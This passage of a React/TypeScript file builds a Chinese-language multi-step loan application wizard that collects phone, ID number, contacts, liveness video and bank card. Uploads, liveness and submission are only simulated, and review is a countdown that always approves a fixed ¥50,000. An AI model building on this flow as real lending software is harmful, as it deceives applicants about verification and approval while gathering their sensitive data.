import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';

interface LoanApplication {
  id?: string;
  sessionId?: string;
  step: number;
  phone?: string;
  isGuest?: boolean;
  // 第2步：身份信息
  idNumber?: string;
  realName?: string;
  // 第4步：联系人信息
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  // 第7步：银行卡
  bankCardNumber?: string;
  // 第11步：提现信息
  withdrawalAmount?: number;
  installmentPeriod?: number;
}

interface StepProps {
  data: LoanApplication;
  onUpdate: (data: Partial<LoanApplication>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
}

// 第1步：用户注册
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [countryCode, setCountryCode] = useState('+86');

  const countryCodes = [
    { code: '+86', name: '中国', flag: '🇨🇳' },
    { code: '+1', name: '美国', flag: '🇺🇸' },
    { code: '+44', name: '英国', flag: '🇬🇧' },
    { code: '+81', name: '日本', flag: '🇯🇵' },
    { code: '+82', name: '韩国', flag: '🇰🇷' },
    { code: '+65', name: '新加坡', flag: '🇸🇬' },
    { code: '+852', name: '香港', flag: '🇭🇰' },
    { code: '+853', name: '澳门', flag: '🇲🇴' },
    { code: '+886', name: '台湾', flag: '🇹🇼' }
  ];

  const handleRegister = () => {
    if (!phone) {
      alert(t('errors.phoneRequired'));
      return;
    }

    if (!password || password.length < 6) {
      alert(t('errors.passwordMin'));
      return;
    }

    if (password !== confirmPassword) {
      alert(t('errors.passwordMismatch'));
      return;
    }

    const fullPhone = countryCode + phone;

    fetch('/api/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        phone: fullPhone, 
        password,
        applicationId: data.id 
      })
    })
    .then(response => response.json())
    .then(result => {
      if (result.success) {
        if (updateApplicationStep) {
          updateApplicationStep(1, { phone: fullPhone, registered: true });
        }
        onUpdate({ phone: fullPhone, isGuest: false });
        onNext();
      } else {
        alert(result.error || t('errors.invalid'));
      }
    })
    .catch(() => {
      alert(t('errors.invalid'));
    });
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step1.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step1.subtitle')}</p>
      </div>
      
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step1.phoneLabel')}
          </label>
          <div className="flex">
            <select 
              value={countryCode}
              onChange={(e) => setCountryCode(e.target.value)}
              className="px-3 py-3 border border-gray-300 border-r-0 rounded-l-lg bg-gray-50 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            >
              {countryCodes.map((country) => (
                <option key={country.code} value={country.code}>
                  {country.flag} {country.code}
                </option>
              ))}
            </select>
            <input
              type="tel"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder={t('loanWizard.step1.phonePlaceholder')}
              className="flex-1 px-4 py-3 border border-gray-300 rounded-r-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step1.passwordLabel')}
          </label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder={t('loanWizard.step1.passwordPlaceholder')}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            minLength={6}
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step1.confirmPasswordLabel')}
          </label>
          <input
            type="password"
            value={confirmPassword}
            onChange={(e) => setConfirmPassword(e.target.value)}
            placeholder={t('loanWizard.step1.confirmPasswordPlaceholder')}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
          />
        </div>

          <button
          onClick={handleRegister}
          disabled={!phone || !password || password !== confirmPassword}
            className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed font-medium"
          >
          {t('loanWizard.step1.registerButton')}
          </button>
      </div>
    </div>
  );
};

// 第2步：身份信息
const Step2Identity: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
  const { t } = useTranslation();
  const [idNumber, setIdNumber] = useState(data.idNumber || '');
  const [realName, setRealName] = useState(data.realName || '');

  const handleNext = () => {
    if (!idNumber || !realName) {
      alert(t('errors.required'));
      return;
    }
    onUpdate({ idNumber, realName });
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step2.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step2.subtitle')}</p>
      </div>
      
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step2.realNameLabel')}
          </label>
          <input
            type="text"
            value={realName}
            onChange={(e) => setRealName(e.target.value)}
            placeholder={t('loanWizard.step2.realNamePlaceholder')}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
          />
        </div>
        
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step2.idNumberLabel')}
          </label>
          <input
            type="text"
            value={idNumber}
            onChange={(e) => setIdNumber(e.target.value)}
            placeholder={t('loanWizard.step2.idNumberPlaceholder')}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            maxLength={18}
          />
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第3步：身份证上传
const Step3IdUpload: React.FC<StepProps> = ({ onNext, onBack }) => {
  const { t } = useTranslation();
  const [frontUploaded, setFrontUploaded] = useState(false);
  const [backUploaded, setBackUploaded] = useState(false);
  const [frontUploading, setFrontUploading] = useState(false);
  const [backUploading, setBackUploading] = useState(false);
  const [frontFileName, setFrontFileName] = useState('');
  const [backFileName, setBackFileName] = useState('');

  const handleFileUpload = (type: 'front' | 'back', file: File) => {
    if (type === 'front') {
      setFrontUploading(true);
      setFrontFileName(file.name);
      // 模拟上传过程
      setTimeout(() => {
        setFrontUploading(false);
        setFrontUploaded(true);
      }, 2000);
    } else {
      setBackUploading(true);
      setBackFileName(file.name);
      // 模拟上传过程
      setTimeout(() => {
        setBackUploading(false);
        setBackUploaded(true);
      }, 2000);
    }
  };

  const handleFileSelect = (type: 'front' | 'back') => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.onchange = (e) => {
      const file = (e.target as HTMLInputElement).files?.[0];
      if (file) {
        handleFileUpload(type, file);
      }
    };
    input.click();
  };

  const handleNext = () => {
    if (!frontUploaded || !backUploaded) {
      alert(t('errors.required'));
      return;
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step3.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step3.subtitle')}</p>
      </div>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
          <div className="space-y-4">
            <div className="text-4xl text-gray-400">📄</div>
            <div>
              <h4 className="font-medium">{t('loanWizard.step3.front')}</h4>
              <p className="text-sm text-gray-500">{t('loanWizard.step3.frontDesc')}</p>
            </div>
            {frontUploaded ? (
              <div className="space-y-2">
                <div className="text-green-600">✓ {frontFileName}</div>
                <div className="text-xs text-gray-500">{t('loanWizard.step3.uploaded')}</div>
              </div>
            ) : frontUploading ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step3.uploading')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{width: '60%'}}></div>
                </div>
              </div>
            ) : (
              <button
                onClick={() => handleFileSelect('front')}
                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
              >
                {t('loanWizard.step3.uploadButton')}
              </button>
            )}
          </div>
        </div>
        
        <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
          <div className="space-y-4">
            <div className="text-4xl text-gray-400">📄</div>
            <div>
              <h4 className="font-medium">{t('loanWizard.step3.back')}</h4>
              <p className="text-sm text-gray-500">{t('loanWizard.step3.backDesc')}</p>
            </div>
            {backUploaded ? (
              <div className="space-y-2">
                <div className="text-green-600">✓ {backFileName}</div>
                <div className="text-xs text-gray-500">{t('loanWizard.step3.uploaded')}</div>
              </div>
            ) : backUploading ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step3.uploading')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{width: '60%'}}></div>
                </div>
              </div>
            ) : (
              <button
                onClick={() => handleFileSelect('back')}
                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
              >
                {t('loanWizard.step3.uploadButton')}
              </button>
            )}
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第4步：联系人信息
const Step4Contacts: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
  const { t } = useTranslation();
  const [contact1Name, setContact1Name] = useState(data.contact1Name || '');
  const [contact1Phone, setContact1Phone] = useState(data.contact1Phone || '');
  const [contact2Name, setContact2Name] = useState(data.contact2Name || '');
  const [contact2Phone, setContact2Phone] = useState(data.contact2Phone || '');

  const handleNext = () => {
    if (!contact1Name || !contact1Phone || !contact2Name || !contact2Phone) {
      alert(t('errors.required'));
      return;
    }
    onUpdate({ contact1Name, contact1Phone, contact2Name, contact2Phone });
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step4.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step4.subtitle')}</p>
      </div>
      
      <div className="space-y-6">
        <div className="border rounded-lg p-4">
          <h4 className="font-semibold mb-4">{t('loanWizard.step4.contact1Title')}</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactNameLabel')}
              </label>
              <input
                type="text"
                value={contact1Name}
                onChange={(e) => setContact1Name(e.target.value)}
                placeholder={t('loanWizard.step4.contactNamePlaceholder')}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactPhoneLabel')}
              </label>
              <input
                type="tel"
                value={contact1Phone}
                onChange={(e) => setContact1Phone(e.target.value)}
                placeholder={t('loanWizard.step4.contactPhonePlaceholder')}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                maxLength={11}
              />
            </div>
          </div>
        </div>

        <div className="border rounded-lg p-4">
          <h4 className="font-semibold mb-4">{t('loanWizard.step4.contact2Title')}</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactNameLabel')}
              </label>
              <input
                type="text"
                value={contact2Name}
                onChange={(e) => setContact2Name(e.target.value)}
                placeholder={t('loanWizard.step4.contactNamePlaceholder')}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {t('loanWizard.step4.contactPhoneLabel')}
              </label>
              <input
                type="tel"
                value={contact2Phone}
                onChange={(e) => setContact2Phone(e.target.value)}
                placeholder={t('loanWizard.step4.contactPhonePlaceholder')}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                maxLength={11}
              />
            </div>
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第5步：活体识别
const Step5LivenessDetection: React.FC<StepProps> = ({ onNext, onBack }) => {
  const { t } = useTranslation();
  const [videoUploaded, setVideoUploaded] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [videoFileName, setVideoFileName] = useState('');
  const [showVideoOptions, setShowVideoOptions] = useState(false);

  const startRecording = () => {
    setIsRecording(true);
    // 模拟3秒录制
    setTimeout(() => {
      setIsRecording(false);
      setVideoUploaded(true);
      setVideoFileName('liveness_video_' + Date.now() + '.mp4');
    }, 3000);
  };

  const handleVideoUpload = (file: File) => {
    setIsUploading(true);
    setVideoFileName(file.name);
    // 模拟上传过程
    setTimeout(() => {
      setIsUploading(false);
      setVideoUploaded(true);
    }, 2000);
  };

  const handleVideoSelect = () => {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'video/*';
    input.onchange = (e) => {
      const file = (e.target as HTMLInputElement).files?.[0];
      if (file) {
        handleVideoUpload(file);
      }
    };
    input.click();
  };

  const handleNext = () => {
    if (!videoUploaded) {
      alert(t('errors.required'));
      return;
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step5.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step5.subtitle')}</p>
      </div>
      
      <div className="text-center">
        <div className="inline-block p-8 border-2 border-dashed border-gray-300 rounded-lg bg-gray-50">
          <div className="space-y-4">
            <div className="text-6xl">📹</div>
            <div>
              <h4 className="font-medium mb-2">{t('loanWizard.step5.livenessTitle')}</h4>
              <p className="text-sm text-gray-500 mb-4">
                {t('loanWizard.step5.livenessDesc')}
              </p>
            </div>
            
            {videoUploaded ? (
              <div className="space-y-2">
                <div className="text-green-600">✓ {videoFileName}</div>
                <div className="text-xs text-gray-500">{t('loanWizard.step5.livenessComplete')}</div>
              </div>
            ) : isUploading ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step5.uploading')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{width: '70%'}}></div>
                </div>
              </div>
            ) : isRecording ? (
              <div className="space-y-2">
                <div className="text-blue-600">{t('loanWizard.step5.recordingDesc')}</div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div className="bg-red-500 h-2 rounded-full animate-pulse" style={{width: '100%'}}></div>
                </div>
              </div>
            ) : !showVideoOptions ? (
              <button
                onClick={() => setShowVideoOptions(true)}
                className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
              >
                {t('loanWizard.step5.startVerificationButton')}
              </button>
            ) : (
              <div className="space-y-3">
                <button
                  onClick={startRecording}
                  className="block w-full px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
                >
                  {t('loanWizard.step5.startRecordingButton')}
                </button>
                <div className="text-gray-500 text-sm">{t('loanWizard.step5.orText')}</div>
                <button
                  onClick={handleVideoSelect}
                  className="block w-full px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700"
                >
                  {t('loanWizard.step5.uploadVideoButton')}
                </button>
              </div>
            )}
          </div>
        </div>
      </div>

      <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
        <h4 className="font-medium text-yellow-800 mb-2">{t('loanWizard.step5.recordingHintTitle')}</h4>
        <ul className="text-sm text-yellow-700 space-y-1">
          <li>• {t('loanWizard.step5.recordingHint1')}</li>
          <li>• {t('loanWizard.step5.recordingHint2')}</li>
          <li>• {t('loanWizard.step5.recordingHint3')}</li>
          <li>• {t('loanWizard.step5.recordingHint4')}</li>
        </ul>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第6步：征信授权
const Step6CreditAuthorization: React.FC<StepProps> = ({ onNext, onBack }) => {
  const { t } = useTranslation();
  const [hasRead, setHasRead] = useState(false);
  const [agreed, setAgreed] = useState(false);

  const handleScroll = (e: React.UIEvent<HTMLDivElement>) => {
    const element = e.currentTarget;
    const bottom = element.scrollHeight - element.scrollTop === element.clientHeight;
    if (bottom) {
      setHasRead(true);
    }
  };

  const handleNext = () => {
    if (!agreed) {
      alert(t('errors.required'));
      return;
    }
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step6.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step6.subtitle')}</p>
      </div>
      
      <div className="border rounded-lg">
        <div className="bg-gray-50 px-4 py-3 border-b">
          <h4 className="font-semibold">{t('loanWizard.step6.creditAgreementTitle')}</h4>
        </div>
        <div 
          className="p-4 h-64 overflow-y-auto text-sm leading-relaxed"
          onScroll={handleScroll}
        >
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementPurpose')}</strong><br/>
            {t('loanWizard.step6.agreementPurposeDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementScope')}</strong><br/>
            {t('loanWizard.step6.agreementScopeDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementPrivacy')}</strong><br/>
            {t('loanWizard.step6.agreementPrivacyDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementPeriod')}</strong><br/>
            {t('loanWizard.step6.agreementPeriodDesc')}
          </p>
          <p className="mb-4">
            <strong>{t('loanWizard.step6.agreementOther')}</strong><br/>
            {t('loanWizard.step6.agreementOtherDesc')}
          </p>
          <p className="mb-4">
            {t('loanWizard.step6.agreementExplanation')}
          </p>
          <div className="text-center py-4 text-gray-500">
            {hasRead ? '✓ 您已阅读完整协议' : '请滑动到底部阅读完整协议'}
          </div>
        </div>
      </div>

      <div className="flex items-center space-x-3">
        <input
          type="checkbox"
          id="credit-agreement"
          checked={agreed}
          onChange={(e) => setAgreed(e.target.checked)}
          disabled={!hasRead}
          className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
        />
        <label htmlFor="credit-agreement" className="text-sm text-gray-700">
          {t('loanWizard.step6.creditAuthorizationLabel')}
        </label>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          disabled={!agreed}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {t('loanWizard.step6.agreeAndContinueButton')}
        </button>
      </div>
    </div>
  );
};

// 第7步：银行卡信息
const Step7BankCard: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
  const { t } = useTranslation();
  const [bankCardNumber, setBankCardNumber] = useState(data.bankCardNumber || '');

  const formatCardNumber = (value: string) => {
    // 移除所有非数字字符
    const numbers = value.replace(/\D/g, '');
    // 每4位添加一个空格
    return numbers.replace(/(\d{4})/g, '$1 ').trim();
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setBankCardNumber(formatted);
  };

  const handleNext = () => {
    const cleanCardNumber = bankCardNumber.replace(/\s/g, '');
    if (!cleanCardNumber || cleanCardNumber.length < 16) {
      alert(t('errors.invalid'));
      return;
    }
    onUpdate({ bankCardNumber: cleanCardNumber });
    onNext();
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step7.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step7.subtitle')}</p>
      </div>
      
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            {t('loanWizard.step7.bankCardLabel')}
          </label>
          <input
            type="text"
            value={bankCardNumber}
            onChange={handleCardNumberChange}
            placeholder={t('loanWizard.step7.bankCardPlaceholder')}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-lg tracking-wider"
            maxLength={23} // 16位数字 + 3个空格
          />
        </div>
        
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step7.securityHintTitle')}</h4>
          <ul className="text-sm text-blue-700 space-y-1">
            <li>{t('loanWizard.step7.securityHint1')}</li>
            <li>{t('loanWizard.step7.securityHint2')}</li>
            <li>{t('loanWizard.step7.securityHint3')}</li>
          </ul>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleNext}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
        >
          {t('loanWizard.step2.nextButton')}
        </button>
      </div>
    </div>
  );
};

// 第8步：提交贷款申请
const Step8SubmitApplication: React.FC<StepProps> = ({ data, onNext, onBack }) => {
  const { t } = useTranslation();
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = () => {
    setIsSubmitting(true);
    // 模拟提交过程
    setTimeout(() => {
      setIsSubmitting(false);
      onNext();
    }, 2000);
  };

  return (
    <div className="space-y-6">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step8.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step8.subtitle')}</p>
      </div>
      
      <div className="bg-gray-50 rounded-lg p-6">
        <h4 className="font-semibold mb-4">{t('loanWizard.step8.applicationSummaryTitle')}</h4>
        <div className="space-y-3 text-sm">
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.phoneLabel')}:</span>
            <span>{data.phone}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.realNameLabel')}:</span>
            <span>{data.realName}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.idNumberLabel')}:</span>
            <span>{data.idNumber}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.contact1Label')}:</span>
            <span>{data.contact1Name} ({data.contact1Phone})</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.contact2Label')}:</span>
            <span>{data.contact2Name} ({data.contact2Phone})</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-600">{t('loanWizard.step8.bankCardLabel')}:</span>
            <span>****{data.bankCardNumber?.slice(-4)}</span>
          </div>
        </div>
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step8.importantHintTitle')}</h4>
        <ul className="text-sm text-blue-700 space-y-1">
          <li>{t('loanWizard.step8.importantHint1')}</li>
          <li>{t('loanWizard.step8.importantHint2')}</li>
          <li>{t('loanWizard.step8.importantHint3')}</li>
          <li>{t('loanWizard.step8.importantHint4')}</li>
        </ul>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
          disabled={isSubmitting}
        >
          {t('loanWizard.step2.backButton')}
        </button>
        <button
          onClick={handleSubmit}
          disabled={isSubmitting}
          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50"
        >
          {isSubmitting ? t('loanWizard.step8.submittingText') : t('loanWizard.step8.submitApplicationButton')}
        </button>
      </div>
    </div>
  );
};

// 第9步：审批中
const Step9Processing: React.FC<StepProps> = ({ onNext }) => {
  const { t } = useTranslation();
  const [timeLeft, setTimeLeft] = useState(10);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          onNext();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [onNext]);

  return (
    <div className="space-y-6 text-center">
      <div>
        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step9.title')}</h3>
        <p className="text-gray-600">{t('loanWizard.step9.subtitle')}</p>
      </div>
      
      <div className="py-12">
        <div className="w-16 h-16 mx-auto mb-6 relative">
          <div className="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
          <div className="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
        </div>
        <div className="text-lg font-medium text-blue-600 mb-2">
          {t('loanWizard.step9.processingTitle')}
        </div>
        <div className="text-sm text-gray-500">
          {t('loanWizard.step9.timeLeft', { time: timeLeft })}
        </div>
      </div>

      <div className="bg-gray-50 rounded-lg p-6">
        <h4 className="font-semibold mb-4">{t('loanWizard.step9.auditProcessTitle')}</h4>
        <div className="space-y-3">
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
              <span className="text-white text-xs">✓</span>
            </div>
            <span className="text-sm">{t('loanWizard.step9.identityVerification')}</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
              <span className="text-white text-xs">✓</span>
            </div>
            <span className="text-sm">{t('loanWizard.step9.creditAuthorization')}</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center animate-pulse">
              <span className="text-white text-xs">?</span>
            </div>
            <span className="text-sm">{t('loanWizard.step9.riskControl')}</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
              <span className="text-white text-xs">-</span>
            </div>
            <span className="text-sm text-gray-400">{t('loanWizard.step9.finalApproval')}</span>
          </div>
        </div>
      </div>
    </div>
  );
};

// 第10步：审批通过
const Step10Approved: React.FC<StepProps> = ({ onNext, onBack }) => {
  const { t } = useTranslation();
  const approvedAmount = 50000; // 模拟审批金额

  return (
    <div className="space-y-6 text-center">
      <div>
        <div className="w-20 h-20 mx-auto mb-4 bg-green-100 rounded-full flex items-center justify-center">
          <span className="text-4xl">🎉</span>
        </div>
        <h3 className="text-2xl font-bold text-green-600 mb-2">{t('loanWizard.step10.congratulationsTitle')}</h3>
        <p className="text-gray-600">{t('loanWizard.step10.approvedDesc')}</p>
      </div>
      
      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
        <h4 className="font-semibold text-green-800 mb-4">{t('loanWizard.step10.approvalResultTitle')}</h4>
        <div className="space-y-2">
          <div className="text-3xl font-bold text-green-600">
            ¥{approvedAmount.toLocaleString()}
          </div>
          <div className="text-sm text-green-700">{t('loanWizard.step10.approvedAmountDesc')}</div>
        </div>
      </div>

      <div className="space-y-4">
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
          <h4 className="font-medium text-blue-800 mb-2">{t('loanWizard.step10.loanConditionsTitle')}</h4>
          <div className="text-sm text-blue-700 space-y-1">
            <div>{t('loanWizard.step10.interestRate')}</div>
            <div>{t('loanWizard.step10.installmentOptions')}</div>
            <div>{t('loanWizard.step10.noPreFee')}</div>
            <div>{t('loanWizard.step10.earlyRepayment')}</div>
          </div>
        </div>
        
        <button
          onClick={onNext}
          className="w-full px-6 py-4 bg-green-600 text-white rounded-lg hover:bg-green-700 font-medium text-lg"
        >
          {t('loanWizard.step10.withdrawNowButton')}
        </button>
      </div>
    </div>
  );
};

// 第11步：提现设置
const Step11Withdrawal: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
  const { t } = useTranslation();
  const [withdrawalAmount, setWithdrawalAmount] = useState(data.withdrawalAmount || '');
  const [installmentPeriod, setInstallmentPeriod] = useState(data.installmentPeriod || 12);
  const maxAmount = 50000;

  const calculateMonthlyPayment = (amount: number, periods: number) => {
    const rate = 0.156 / 12; // 月利率
    const monthlyPayment = (amount * rate * Math.pow(1 + rate, periods)) / (Math.pow(1 + rate, periods) - 1);
    return monthlyPayment;
  };

     const handleNext = () => {
     const amount = parseFloat(withdrawalAmount.toString());
     if (!amount || amount <= 0 || amount > maxAmount) {
       alert(t('errors.invalid'));
       return;
     }
     onUpdate({ withdrawalAmount: amount, installmentPeriod });
     onNext();
   };

